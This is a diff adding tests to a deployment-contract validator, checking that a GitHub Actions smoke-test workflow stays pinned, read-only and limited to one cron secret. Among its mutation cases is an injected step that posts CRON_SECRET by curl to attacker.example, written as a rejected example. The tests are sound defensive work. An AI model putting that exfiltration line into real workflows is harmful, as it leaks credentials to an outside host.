@@ -16,6 +16,8 @@ function currentContract() {
     outboxWatchdogWorkflow: readFileSync('.github/workflows/outbox-dispatch-watchdog.yml', 'utf8'),
     outboxWatchdogScript: readFileSync('scripts/github-outbox-dispatch-watchdog.mjs', 'utf8'),
     productionSmokeWorkflow: readFileSync('.github/workflows/production-smoke.yml', 'utf8'),
+    executionSmokeWorkflow: readFileSync('.github/workflows/execution-smoke.yml', 'utf8'),
+    executionSmokeScript: readFileSync('scripts/github-execution-smoke.mjs', 'utf8'),
     files: new Set([
       'index.html',
       'package-lock.json',
@@ -26,6 +28,8 @@ function currentContract() {
       'scripts/github-outbox-dispatch-watchdog.mjs',
       '.github/workflows/production-smoke.yml',
       'scripts/production-smoke.mjs',
+      '.github/workflows/execution-smoke.yml',
+      'scripts/github-execution-smoke.mjs',
       'privacy.html',
       'terms.html',
       ...readdirSync('api').filter(file => file.endsWith('.js')).map(file => `api/${file}`),
@@ -367,6 +371,21 @@ test('deployability rejects a production smoke workflow that gains secrets, writ
   assert.ok(validateDeploymentContract(anyEnvironment).includes(
     'production smoke must run only for the Vercel Production environment'));
 
+  // GitHub records a "production" deployment for every environment job, and
+  // expression comparison ignores case, so only Vercel-created ones may run it.
+  assert.match(cloneContract().productionSmokeWorkflow,
+    /github\.event\.deployment\.creator\.login == 'vercel\[bot\]'\)/);
+  for(const [from,to] of [
+    [" &&\n      github.event.deployment.creator.login == 'vercel[bot]')",')'],
+    ["creator.login == 'vercel[bot]'","creator.login != ''"],
+  ]){
+    const anyCreator=cloneContract();
+    anyCreator.productionSmokeWorkflow=anyCreator.productionSmokeWorkflow.replace(from,to);
+    assert.notEqual(anyCreator.productionSmokeWorkflow,cloneContract().productionSmokeWorkflow);
+    assert.ok(validateDeploymentContract(anyCreator).includes(
+      'production smoke must ignore deployments that GitHub environment jobs create'),to);
+  }
+
   const missing=cloneContract();
   missing.productionSmokeWorkflow=null;
   assert.ok(validateDeploymentContract(missing).includes('production smoke workflow must be readable'));
@@ -375,4 +394,90 @@ test('deployability rejects a production smoke workflow that gains secrets, writ
   renamedScript.packageJson.scripts['smoke:production']='node -e 0';
   assert.ok(validateDeploymentContract(renamedScript).includes(
     'package.json must define smoke:production as node scripts/production-smoke.mjs'));
+});
+
+const UNSAFE_EXECUTION_SMOKE='execution smoke must remain read-only, non-mutating, and limited to its reviewed cron credential';
+
+test('the execution smoke is pinned, least-privilege, and limited to the cron credential',()=>{
+  const contract=currentContract();
+  assert.deepEqual(validateDeploymentContract(contract),[]);
+  assert.match(contract.executionSmokeWorkflow,/^    environment: production$/m);
+  assert.deepEqual(contract.executionSmokeWorkflow.match(/(?:secrets|vars)\.[A-Z_]+/g),
+    ['vars.APP_URL','secrets.CRON_SECRET']);
+  assert.match(contract.executionSmokeWorkflow,/github\.event\.deployment\.creator\.login == 'vercel\[bot\]'/);
+  assert.doesNotMatch(contract.executionSmokeWorkflow,/pull_request|TURSO_|RESEND_|VERCEL_/);
+});
+
+test('deployability rejects a widened, re-triggerable, or replaced execution smoke',()=>{
+  const missing=cloneContract();
+  missing.files.delete('.github/workflows/execution-smoke.yml');
+  missing.files.delete('scripts/github-execution-smoke.mjs');
+  missing.executionSmokeWorkflow=null;
+  missing.executionSmokeScript=undefined;
+  let errors=validateDeploymentContract(missing);
+  for(const expected of [
+    'required deployment file is missing: .github/workflows/execution-smoke.yml',
+    'required deployment file is missing: scripts/github-execution-smoke.mjs',
+    'execution smoke workflow must be readable',
+    'execution smoke workflow must match its reviewed immutable contract',
+    'execution smoke assessor must match its reviewed immutable contract',
+  ]) assert.ok(errors.includes(expected),expected);
+
+  const mutations=[
+    ['  workflow_dispatch:\n','  workflow_dispatch:\n  pull_request:\n',
+      ['execution smoke triggers must be deployment_status, one daily schedule, and workflow_dispatch only',
+        UNSAFE_EXECUTION_SMOKE]],
+    ['  deployment_status:\n','  deployment_status:\n  pull_request_target:\n',[UNSAFE_EXECUTION_SMOKE]],
+    ["    - cron: '29 7 * * *'","    - cron: '*/5 * * * *'",
+      ['execution smoke triggers must be deployment_status, one daily schedule, and workflow_dispatch only']],
+    ['  contents: read\n','  contents: write\n',
+      ['execution smoke permissions must be contents: read only',UNSAFE_EXECUTION_SMOKE]],
+    ["      github.event.deployment.creator.login == 'vercel[bot]') ||\n","      true) ||\n",
+      ['execution smoke must run only for successful Vercel Production deployments or from the default branch']],
+    ["github.event.deployment.environment == 'Production'","github.event.deployment.environment != ''",
+      ['execution smoke must run only for successful Vercel Production deployments or from the default branch']],
+    ['    environment: production\n','',
+      ['execution smoke must read its credential through the production environment']],
+    ['    timeout-minutes: 5\n','    timeout-minutes: 60\n',['execution smoke job must be time bounded']],
+    ['      cancel-in-progress: false\n','      cancel-in-progress: true\n',
+      ['execution smoke runs must be serialized']],
+    ['actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1','actions/checkout@v7',
+      ['execution smoke checkout must use the reviewed immutable revision',
+        'execution smoke actions must be pinned to immutable commits']],
+    ['actions/setup-node@820762786026740c76f36085b0efc47a31fe5020','actions/setup-node@v7',
+      ['execution smoke Node setup must use the reviewed immutable revision']],
+    ['          ref: ${{ github.event.repository.default_branch }}\n','',
+      ['execution smoke must run the default-branch assessor']],
+    ['persist-credentials: false','persist-credentials: true',
+      ['execution smoke checkout must not persist GitHub credentials']],
+    ['        run: node scripts/github-execution-smoke.mjs','        run: node scripts/github-execution-smoke.mjs || true',
+      ['execution smoke step must retain its exact fail-closed shape']],
+    ["EXECUTION_SMOKE_TRIGGER: ${{ github.event_name == 'deployment_status' && 'deploy' || 'schedule' }}",
+      "EXECUTION_SMOKE_TRIGGER: 'schedule'",['execution smoke step must retain its exact fail-closed shape']],
+    ['        run: node scripts/github-execution-smoke.mjs',
+      '        continue-on-error: true\n        run: node scripts/github-execution-smoke.mjs',
+      ['execution smoke step must retain its exact fail-closed shape',UNSAFE_EXECUTION_SMOKE]],
+    ['          CRON_SECRET: ${{ secrets.CRON_SECRET }}\n',
+      '          CRON_SECRET: ${{ secrets.CRON_SECRET }}\n          TURSO_AUTH_TOKEN: ${{ secrets.TURSO_AUTH_TOKEN }}\n',
+      ['execution smoke step must retain its exact fail-closed shape',UNSAFE_EXECUTION_SMOKE]],
+    ['secrets.CRON_SECRET','secrets.OUTBOX_DISPATCH_SECRET',[UNSAFE_EXECUTION_SMOKE]],
+    ['vars.APP_URL','vars.OTHER_URL',[UNSAFE_EXECUTION_SMOKE]],
+    ['      - name: Run the live execution smoke check\n',
+      '      - name: Leak\n        run: curl -d "$CRON_SECRET" https://attacker.example\n\n      - name: Run the live execution smoke check\n',
+      [UNSAFE_EXECUTION_SMOKE]],
+  ];
+  for(const [from,to,expected] of mutations){
+    const mutated=cloneContract();
+    mutated.executionSmokeWorkflow=mutated.executionSmokeWorkflow.replace(from,to);
+    assert.notEqual(mutated.executionSmokeWorkflow,currentContract().executionSmokeWorkflow,from);
+    errors=validateDeploymentContract(mutated);
+    for(const message of [...expected,'execution smoke workflow must match its reviewed immutable contract']){
+      assert.ok(errors.includes(message),`${JSON.stringify(to)} -> ${message}\n${errors.join('\n')}`);
+    }
+  }
+
+  const replacedAssessor=cloneContract();
+  replacedAssessor.executionSmokeScript='process.exitCode=0;\n';
+  assert.deepEqual(validateDeploymentContract(replacedAssessor),
+    ['execution smoke assessor must match its reviewed immutable contract']);
 });
